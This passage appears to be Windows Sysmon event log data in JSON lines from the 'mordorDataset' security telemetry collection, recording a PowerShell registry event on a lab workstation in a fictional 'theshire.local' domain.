08:28:39.873","Hostname":"WORKSTATION6.theshire.local","RuleName":"-","tags":["mordorDataset"]}
{"Keywords":-9223372036854775808,"SeverityValue":2,"TargetObject":"HKU\\S-1-5-21-4228717743-1032521047-1810997296-1104\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Connections","EventTypeOrignal":"INFO","EventID":12,"ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","ExecutionProcessID":3172,"host":"wec.internal.cloudapp.net","Channel":"Microsoft-Windows-Sysmon/Operational","UserID":"S-1-5-18","AccountType":"User","ThreadID":4048,"ProcessGuid":"{b34bc01c-a92a-5f69-7e02-000000000900}","EventReceivedTime":"2020-09-22 04:28:41","Opcode":"Info","EventTime":"2020-09-22 04:28:40","@timestamp":"2020-09-22T08:28:41.537Z","SourceModuleType":"im_msvistalog","port":64545,"AccountName":"SYSTEM","RecordNumber":3400664,"Task":12,"Domain":"NT AUTHORITY","@version":"1","OpcodeValue":0,"SourceModuleName":"eventlog","Severity":"INFO","SourceName":"Microsoft-Windows-Sysmon","Version":2,"Image":"C:\\windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","Category":"Registry object added or deleted (rule: RegistryEvent)","UtcTime":"2020-09-22 08:28:40.116","Hostname":"WORKSTATION5.theshire.local","RuleName":"-","tags":["mordorDataset"]}
